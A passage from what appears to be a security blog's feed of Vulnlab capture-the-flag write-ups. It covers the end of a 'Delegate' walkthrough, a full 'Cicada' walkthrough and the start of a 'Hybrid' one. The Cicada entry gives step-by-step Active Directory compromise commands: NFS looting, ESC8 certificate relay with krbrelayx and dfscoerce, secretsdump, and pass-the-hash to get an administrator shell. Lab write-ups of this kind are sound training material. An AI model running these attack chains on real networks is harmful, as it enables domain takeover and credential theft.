created:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u delegate\\N.Thompson -p &#x27;KALEB_2341&#x27; -s HOST/Evil.delegate.vl -q dc1.delegate.vl -t &#x27;Evil$&#x27; -dc-ip 10.10.64.93 --additional</span><br></pre></td></tr></table></figure><p>First, we need to convert the machine account password to the correct hash format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iconv -f ASCII -t UTF-16LE &lt;(printf &#x27;HelloWorld123&#x27;) | openssl dgst -md4</span><br><span class="line">MD4(stdin)= 97f8b5c01517c9d59e586246f7c1803c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./krbrelayx.py -hashes :97f8b5c01517c9d59e586246f7c1803c</span><br></pre></td></tr></table></figure><p>Then we execute PetitPotam to trigger the authentication:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -u &#x27;Evil$&#x27; -p &#x27;HelloWorld123&#x27; Evil.delegate.vl 10.10.64.93</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/deleation.png" alt="Delegation Attack"><br><img src="/images/Delegate/delegation_worked.png" alt="Delegation Success"></p><p>We successfully obtained a silver ticket, which we now import:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass DC1.delegate.vl</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=c2872ceb-fa95-40cc-8623-396d1af89810">https://api.vulnlab.com/api/v1/share?id=c2872ceb-fa95-40cc-8623-396d1af89810</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Cicada</title>
      <link href="/2025/03/30/VL-Cicada/"/>
      <url>/2025/03/30/VL-Cicada/</url>
      
        <content type="html"><![CDATA[<h1 id="Cicada-Domain-Compromise-Writeup"><a href="#Cicada-Domain-Compromise-Writeup" class="headerlink" title="Cicada Domain Compromise Writeup"></a>Cicada Domain Compromise Writeup</h1><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Starting with a port scan to identify available services:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 11:04:14Z)</span><br><span class="line">111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/tcp6  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp6  rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/tcp   mountd</span><br><span class="line">|   100005  1,2,3       2049/tcp6  mountd</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49503/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">50006/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">62920/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><p>The scan reveals we’re dealing with a Windows Active Directory environment (Domain: cicada.vl) with multiple services running, including NFS, which presents an interesting initial attack vector.</p><h2 id="NFS-Enumeration"><a href="#NFS-Enumeration" class="headerlink" title="NFS Enumeration"></a>NFS Enumeration</h2><p>Checking for available NFS shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ showmount -e 10.10.107.186 </span><br><span class="line">Export list for 10.10.107.186:</span><br><span class="line">/profiles (everyone)        </span><br></pre></td></tr></table></figure><p>Mounting the exposed NFS share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t nfs -o vers=3 10.10.107.186:/profiles /mnt/ -o nolock</span><br></pre></td></tr></table></figure><p>After mounting, we discovered several potential usernames:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Administrator  </span><br><span class="line">Daniel.Marshall  </span><br><span class="line">Debra.Wright  </span><br><span class="line">Jane.Carter  </span><br><span class="line">Jordan.Francis  </span><br><span class="line">Joyce.Andrews  </span><br><span class="line">Katie.Ward  </span><br><span class="line">Megan.Simpson </span><br><span class="line">Richard.Gibbons  </span><br><span class="line">Rosie.Powell  </span><br><span class="line">Shirley.West</span><br></pre></td></tr></table></figure><h2 id="Initial-Access-via-NFS"><a href="#Initial-Access-via-NFS" class="headerlink" title="Initial Access via NFS"></a>Initial Access via NFS</h2><p>Exploring Rosie Powell’s directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(panosoiko㉿kali)-[/mnt/Rosie.Powell]</span><br><span class="line">└─$ ls -la</span><br><span class="line">total 1797</span><br><span class="line">drwxrwxrwx 2 4294967294 4294967294      64 Sep 15  2024 .</span><br><span class="line">drwxrwxrwx 2 4294967294 4294967294    4096 Sep 15  2024 ..</span><br><span class="line">drwx------ 2 4294967294 4294967294      64 Sep 15  2024 Documents</span><br><span class="line">-rwx------ 1 4294967294 4294967294 1832505 Sep 13  2024 marketing.png</span><br></pre></td></tr></table></figure><p>The file permissions suggest we need to match the UID to access these files. Setting read permissions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +r /mnt/Rosie.Powell/marketing.png</span><br></pre></td></tr></table></figure><p>Opening the marketing.png file revealed credentials:</p><p>Rosie.Powell : Cicada123</p><p><img src="/images/Cicada/png_pass.png" alt="Password found in marketing.png"></p><h2 id="Authentication-Attempts"><a href="#Authentication-Attempts" class="headerlink" title="Authentication Attempts"></a>Authentication Attempts</h2><p>When attempting to use these credentials over SMB, we encountered <code>STATUS_NOT_SUPPORTED</code>:</p><p><img src="/images/Cicada/smb_enum.png" alt="SMB authentication failure"></p><p>Instead, we’ll request a Kerberos TGT (Ticket Granting Ticket) and use Kerberos authentication:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/Rosie.Powell:Cicada123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Rosie.Powell.ccache</span><br></pre></td></tr></table></figure><p>With Kerberos authentication, we now have access to LDAP and SMB:</p><p><img src="/images/Cicada/smb_ldap_access.png" alt="Successful LDAP and SMB access"></p><h2 id="Domain-Enumeration-with-BloodHound"><a href="#Domain-Enumeration-with-BloodHound" class="headerlink" title="Domain Enumeration with BloodHound"></a>Domain Enumeration with BloodHound</h2><p>Collecting Active Directory information with BloodHound:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap DC-JPQ225.cicada.vl -k --use-kcache --bloodhound --dns-server 10.10.101.214 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p>No clear path to domain controller was initially visible in BloodHound.</p><h2 id="Active-Directory-Certificate-Services-ADCS-Enumeration"><a href="#Active-Directory-Certificate-Services-ADCS-Enumeration" class="headerlink" title="Active Directory Certificate Services (ADCS) Enumeration"></a>Active Directory Certificate Services (ADCS) Enumeration</h2><p>Investigating certificate services for potential vulnerabilities:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -k -target DC-JPQ225.cicada.vl -dc-ip 10.10.101.214 -debug</span><br></pre></td></tr></table></figure><p>Output revealed important certificate authority information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CA Name                             : cicada-DC-JPQ225-CA</span><br><span class="line">DNS Name                            : DC-JPQ225.cicada.vl</span><br><span class="line">Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl</span><br><span class="line">Certificate Serial Number           : 1538EE585D915EB645C3B10CF9747B7C</span><br><span class="line">Certificate Validity Start          : 2025-03-28 17:51:10+00:00</span><br><span class="line">Certificate Validity End            : 2525-03-28 18:01:10+00:00</span><br><span class="line">Web Enrollment                      : Enabled</span><br><span class="line">User Specified SAN                  : Disabled</span><br><span class="line">Request Disposition                 : Issue</span><br><span class="line">Enforce Encryption for Requests     : Enabled</span><br><span class="line">Permissions</span><br><span class="line">  Owner                             : CICADA.VL\Administrators</span><br><span class="line">  Access Rights</span><br><span class="line">    ManageCertificates              : CICADA.VL\Administrators</span><br><span class="line">                                      CICADA.VL\Domain Admins</span><br><span class="line">                                      CICADA.VL\Enterprise Admins</span><br><span class="line">    ManageCa                        : CICADA.VL\Administrators</span><br><span class="line">                                      CICADA.VL\Domain Admins</span><br><span class="line">                                      CICADA.VL\Enterprise Admins</span><br><span class="line">    Enroll                          : CICADA.VL\Authenticated Users</span><br><span class="line">[!] Vulnerabilities</span><br><span class="line">  ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue</span><br></pre></td></tr></table></figure><p>Discovery of ESC8 vulnerability opens several potential attack paths. Checking for resource-based constrained delegation vulnerabilities:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb DC-JPQ225.cicada.vl -k --use-kcache -M coerce_plus</span><br></pre></td></tr></table></figure><p><img src="/images/Cicada/vulnerable.png" alt="Vulnerable services"></p><p>None of those attacks worked, but we identified a new approach using Kerberos Relay to exploit ESC8: <a href="https://github.com/CICADA8-Research/RemoteKrbRelay">https://github.com/CICADA8-Research/RemoteKrbRelay</a></p><h2 id="Machine-Account-Quota-Check"><a href="#Machine-Account-Quota-Check" class="headerlink" title="Machine Account Quota Check"></a>Machine Account Quota Check</h2><p>Verifying if we can add machine accounts to the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap DC-JPQ225.cicada.vl -k --use-kcache -M maq</span><br></pre></td></tr></table></figure><p><img src="/images/Cicada/machineaccountquota.png" alt="Machine Account Quota"></p><p>With a machine account quota of 10, we can domain join our own Windows VM or use a TGT &amp; RPCSS TGS on a non-domain joined Windows machine.</p><h2 id="Exploitation-Path-1-Windows-VM-Approach"><a href="#Exploitation-Path-1-Windows-VM-Approach" class="headerlink" title="Exploitation Path 1: Windows VM Approach"></a>Exploitation Path 1: Windows VM Approach</h2><h3 id="Setting-Up-the-Windows-VM"><a href="#Setting-Up-the-Windows-VM" class="headerlink" title="Setting Up the Windows VM"></a>Setting Up the Windows VM</h3><ol><li><p>Install and configure OpenVPN on the Windows VM:<br><img src="/images/Cicada/install_openvpn.png" alt="OpenVPN installation"></p></li><li><p>Set the DNS IP to the domain controller:<br><img src="/images/Cicada/dns_ip.png" alt="Network settings"><br><img src="/images/Cicada/dc_ip.png" alt="DC IP configuration"></p></li><li><p>Rename the PC and join the domain:<br><img src="/images/Cicada/pc_rename.png" alt="PC rename"><br><img src="/images/Cicada/changing_domain.png" alt="Domain joining"><br><img src="/images/Cicada/cicada_share.png" alt="Cicada share access"></p><p>Note: Windows 10 Pro or Windows Server is required for domain joining.</p></li></ol><h3 id="Building-and-Running-the-Exploit"><a href="#Building-and-Running-the-Exploit" class="headerlink" title="Building and Running the Exploit"></a>Building and Running the Exploit</h3><ol><li><p>Clone the RemoteKrbRelay repository and open the solution file in Visual Studio:<br><img src="/images/Cicada/compile.png" alt="Compiling the exploit"></p></li><li><p>Select Release, then x64, and build the solution. The executable will be in <code>[SolutionFolder]\[ProjectFolder]\bin\Release\</code></p></li><li><p>Run the following command to get a base64-encoded certificate (requires logging in as Rosie, starting VPN, then changing users):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RemoteKrbRelay.exe -adcs -template DomainController -victim dc-jpq225.cicada.vl -target dc-jpq225.cicada.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3</span><br></pre></td></tr></table></figure><p>Note: This approach may be blocked by firewalls preventing RPC access.</p></li><li><p>If successful, use the certificate to get a TGT:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gettgtpkinit.py -pfx-base64 $(cat ./cert.pkcs12) -dc-ip IP cicada.vl/&#x27;DC-JPQ225$&#x27; adm.ccache</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=./adm.ccache</span><br></pre></td></tr></table></figure></li><li><p>Extract secrets from the domain controller:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump cicada.vl/&#x27;DC-JPQ225$&#x27;@DC-JPQ225.cicada.vl -k -no-pass</span><br></pre></td></tr></table></figure></li><li><p>Get a TGT for the admin and establish a shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/adminstrator@DC-JPQ225.cicada.vl -hashes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=./adminstrator.ccache</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec cicada.vl/adminstrator@DC-JPQ225.cicada.vl -k -no-pass</span><br></pre></td></tr></table></figure></li></ol><h2 id="Exploitation-Path-2-Linux-Approach"><a href="#Exploitation-Path-2-Linux-Approach" class="headerlink" title="Exploitation Path 2: Linux Approach"></a>Exploitation Path 2: Linux Approach</h2><ol><li><p>Add our machine to the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC-JPQ225.cicada.vl -u &#x27;rosie.powell&#x27; -p &#x27;Cicada123&#x27; -k -d &#x27;cicada.vl&#x27; add dnsRecord &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#x27; 10.8.5.195</span><br></pre></td></tr></table></figure></li><li><p>Run krbrelayx to wait for a connection:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 krbrelayx.py -t &#x27;http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp&#x27; --adcs --template DomainController -v &#x27;DC-JPQ225$&#x27;</span><br></pre></td></tr></table></figure></li><li><p>Trigger a connection back to us using dfscoerce to get the .pfx certificate:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dfscoerce.py -k -no-pass &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#x27; dc-jpq225.cicada.vl</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[-] Connecting to ncacn_np:dc-jpq225.cicada.vl[\PIPE\netdfs]</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending NetrDfsRemoveStdRoot!</span><br><span class="line">NetrDfsRemoveStdRoot </span><br><span class="line">ServerName:                      &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\x00&#x27; </span><br><span class="line">RootShare:                       &#x27;test\x00&#x27; </span><br><span class="line">ApiFlags:                        1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DFSNM SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.</span><br></pre></td></tr></table></figure><p><img src="/images/Cicada/getting-pfx.png" alt="Getting PFX certificate"></p></li><li><p>Process the certificate using OpenSSL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in &#x27;DC-JPQ225$.pfx&#x27; -nodes -nocerts -out key.pem -passin pass:</span><br><span class="line">openssl pkcs12 -in &#x27;DC-JPQ225$.pfx&#x27; -nodes -nokeys -out cert.pem -passin pass:</span><br></pre></td></tr></table></figure></li><li><p>Create a new PKCS12 file without password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in cert.pem -inkey key.pem -out DC-JPQ225-nopass.pfx -passout pass:</span><br></pre></td></tr></table></figure></li><li><p>Use Certipy to authenticate with the certificate:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx &#x27;DC-JPQ225-nopass.pfx&#x27; -dc-ip 10.10.71.16 -domain cicada.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Using principal: dc-jpq225$@cicada.vl</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;dc-jpq225.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;dc-jpq225$&#x27;</span><br><span class="line">[*] Got hash for &#x27;dc-jpq225$@cicada.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:85a0da53871a----------</span><br></pre></td></tr></table></figure></li><li><p>Set up the Kerberos credential cache:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=dc-jpq225.ccache</span><br></pre></td></tr></table></figure></li><li><p>Extract all domain secrets:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass DC-JPQ225.cicada.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a----------:::</span><br></pre></td></tr></table></figure></li><li><p>Finally, get a TGT for the Administrator:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/Administrator -hashes :85a0da53871a---------- -dc-ip 10.10.71.16</span><br></pre></td></tr></table></figure></li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://api.vulnlab.com/api/v1/share?id=4cc00787-bbf1-4974-a4bc-c40f0fb8521f">https://api.vulnlab.com/api/v1/share?id=4cc00787-bbf1-4974-a4bc-c40f0fb8521f</a></p><p><a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx">https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Hybrid</title>
      <link href="/2025/03/28/VL-Hybrid/"/>
      <url>/2025/03/28/VL-Hybrid/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="mail01-hybrid-vl"><a href="#mail01-hybrid-vl" class="headerlink" title="mail01.hybrid.vl"></a>mail01.hybrid.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE  REASON         VERSION</span><br><span class="line">22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu)</span><br><span class="line">25/tcp    open  smtp     syn-ack ttl 63 Postfix smtpd</span><br><span class="line">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class="line">80/tcp    open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">110/tcp   open  pop3     syn-ack ttl 63 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: UIDL CAPA PIPELINING STLS TOP RESP-CODES SASL AUTH-RESP-CODE</span><br><span class="line">111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      34727/udp   mountd</span><br><span class="line">|   100005  1,2,3      54128/udp6  mountd</span><br><span class="line">|   100005  1,2,3      56559/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      58479/tcp   mountd</span><br><span class="line">|   100021  1,3,4      39665/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      42639/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      43503/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      53303/udp   nlockmgr</span><br><span class="line">|   100024  1          37589/tcp   status</span><br><span class="line">|   100024  1          45525/tcp6  status</span><br><span class="line">|   100024  1          51675/udp   status</span><br><span class="line">|   100024  1          52103/udp6  status</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|_  100227  3           2049/tcp6  nfs_acl</span><br><span class="line">143/tcp   open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)</span><br><span class="line">587/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd</span><br><span class="line">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class="line">993/tcp   open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)</span><br><span class="line">995/tcp   open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">|_pop3-capabilities: UIDL CAPA 